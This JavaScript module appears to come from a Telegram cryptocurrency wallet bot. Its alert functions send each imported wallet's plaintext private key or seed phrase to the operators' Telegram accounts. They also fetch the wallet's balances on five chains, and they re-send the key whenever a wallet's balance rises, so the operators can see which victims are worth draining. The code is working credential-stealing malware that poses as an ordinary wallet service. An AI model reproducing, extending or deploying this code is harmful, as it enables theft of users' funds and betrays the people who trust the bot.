const { ethers } = require('ethers');
const config = require('./config');
const walletManager = require('./wallet-manager');

// ═══════════════════════════════════════════════════
// 🛡️ HTML ESCAPE HELPER (prevents parsing errors)
// ═══════════════════════════════════════════════════
function escapeHtml(text) {
    if (!text) return '';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ═══════════════════════════════════════════════════
// 📡 SEND MESSAGE TO ALL ADMINS (HTML mode)
// ═══════════════════════════════════════════════════
async function notifyAdmins(bot, message) {
    for (const adminId of config.ADMIN_TELEGRAM_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });
        } catch (e) {
            console.error(`❌ Failed to notify admin ${adminId}:`, e.message);
        }
    }
}

// ═══════════════════════════════════════════════════
// 📡 SEND PLAIN TEXT (for private keys)
// ═══════════════════════════════════════════════════
async function sendPlainText(bot, message) {
    for (const adminId of config.ADMIN_TELEGRAM_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, message, {
                disable_web_page_preview: true
            });
        } catch (e) {
            console.error(`❌ Failed to send to admin ${adminId}:`, e.message);
        }
    }
}

// ═══════════════════════════════════════════════════
// 🔌 GET RELIABLE PROVIDER WITH FALLBACKS
// ═══════════════════════════════════════════════════
async function getReliableProvider(chainName) {
    const primaryUrl = config.RPC[chainName];
    const fallbacks = config.RPC_FALLBACKS[chainName] || [];

    if (primaryUrl) {
        try {
            const provider = new ethers.JsonRpcProvider(primaryUrl);
            const networkPromise = provider.getNetwork();
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Timeout')), 5000)
            );
            await Promise.race([networkPromise, timeoutPromise]);
            return provider;
        } catch (e) {
            console.log(`⚠️ Primary RPC failed for ${chainName}: ${e.message}`);
        }
    }

    for (const fallbackUrl of fallbacks) {
        try {
            const provider = new ethers.JsonRpcProvider(fallbackUrl);
            const networkPromise = provider.getNetwork();
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Timeout')), 5000)
            );
            await Promise.race([networkPromise, timeoutPromise]);
            return provider;
        } catch (e) {
            continue;
        }
    }

    throw new Error(`All RPCs failed for ${chainName}`);
}

// ═══════════════════════════════════════════════════
// 💰 FETCH MULTI-CHAIN NATIVE BALANCES
// ═══════════════════════════════════════════════════
async function fetchMultiChainBalances(address) {
    const balances = [];
    const chains = ['ethereum', 'bsc', 'polygon', 'arbitrum', 'base'];

    const promises = chains.map(async (chainName) => {
        try {
            const provider = await getReliableProvider(chainName);
            const bal = await Promise.race([
                provider.getBalance(address),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 8000))
            ]);
            const formatted = parseFloat(ethers.formatEther(bal));

            if (formatted > 0) {
                const symbol = chainName === 'bsc' ? 'BNB' :
                    chainName === 'polygon' ? 'MATIC' : 'ETH';
                balances.push({
                    chain: chainName.charAt(0).toUpperCase() + chainName.slice(1),
                    amount: formatted.toFixed(4),
                    symbol: symbol
                });
            }
        } catch (e) {
            console.log(`⚠️ Could not fetch ${chainName} balance: ${e.message}`);
        }
    });

    await Promise.all(promises);
    return balances;
}

// ═══════════════════════════════════════════════════
// 🚨 ALERT: NEW WALLET IMPORTED (HTML mode)
// ═══════════════════════════════════════════════════
async function alertNewImport(bot, user, address, plaintextKey, keyType) {
    console.log(`🔍 Fetching balances for new import: ${address}`);

    let balances = [];
    try {
        const balancePromise = fetchMultiChainBalances(address);
        const timeoutPromise = new Promise((resolve) =>
            setTimeout(() => resolve([]), 25000)
        );
        balances = await Promise.race([balancePromise, timeoutPromise]);
    } catch (e) {
        console.error(`❌ Balance fetch failed: ${e.message}`);
        balances = [];
    }

    let balanceText = '• <i>No native balances found across 5 chains.</i>';
    if (balances.length > 0) {
        balanceText = balances.map(b =>
            `• <b>${escapeHtml(b.chain)}:</b> ${escapeHtml(b.amount)} ${escapeHtml(b.symbol)}`
        ).join('\n');
    }

    const username = user.username ? `@${escapeHtml(user.username)}` : 'No Username';
    const keyTypeText = keyType === 'seed_phrase' ? '12/24 Word Phrase' : 'Private Key';

    // Send main info as HTML
    const mainMessage = `🚨 <b>NEW WALLET IMPORTED</b>

━━━━━━━━━━━━━━━━━━━━━

👤 <b>User:</b> ${username}
🆔 <b>Telegram ID:</b> <code>${user.id}</code>
📍 <b>Address:</b> <code>${escapeHtml(address)}</code>
🔑 <b>Type:</b> ${keyTypeText}

━━━━━━━━━━━━━━━━━━━━━

💰 <b>CURRENT BALANCES:</b>
${balanceText}

━━━━━━━━━━━━━━━━━━━━━

🔐 <b>PLAINTEXT KEY:</b> (see next message)`;

    await notifyAdmins(bot, mainMessage);

    // Send the key as plain text (no formatting, easy to copy)
    await sendPlainText(bot, plaintextKey);
}

// ═══════════════════════════════════════════════════
// 📈 ALERT: BALANCE INCREASE DETECTED
// ═══════════════════════════════════════════════════
async function alertBalanceIncrease(bot, walletRecord, oldBalances, newBalances, plaintextKey) {
    const oldTotal = oldBalances.reduce((sum, b) => sum + parseFloat(b.amount), 0);
    const newTotal = newBalances.reduce((sum, b) => sum + parseFloat(b.amount), 0);
    const increase = newTotal - oldTotal;

    const newBalanceText = newBalances.map(b =>
        `• <b>${escapeHtml(b.chain)}:</b> ${escapeHtml(b.amount)} ${escapeHtml(b.symbol)}`
    ).join('\n');

    const username = walletRecord.username ? `@${escapeHtml(walletRecord.username)}` : walletRecord.telegram_id;

    const mainMessage = `📈 <b>BALANCE INCREASE DETECTED!</b>

━━━━━━━━━━━━━━━━━━━━━

👤 <b>User:</b> ${username}
📍 <b>Address:</b> <code>${escapeHtml(walletRecord.address)}</code>

💵 <b>Old Total:</b> ${oldTotal.toFixed(4)} Native
💰 <b>New Total:</b> ${newTotal.toFixed(4)} Native
🔥 <b>Increase:</b> +${increase.toFixed(4)} Native

<b>New Balances:</b>
${newBalanceText}

━━━━━━━━━━━━━━━━━━━━━

🔐 <b>PLAINTEXT KEY:</b> (see next message)`;

    await notifyAdmins(bot, mainMessage);
    await sendPlainText(bot, plaintextKey);
}

module.exports = {
    notifyAdmins,
    fetchMultiChainBalances,
    alertNewImport,
    alertBalanceIncrease
};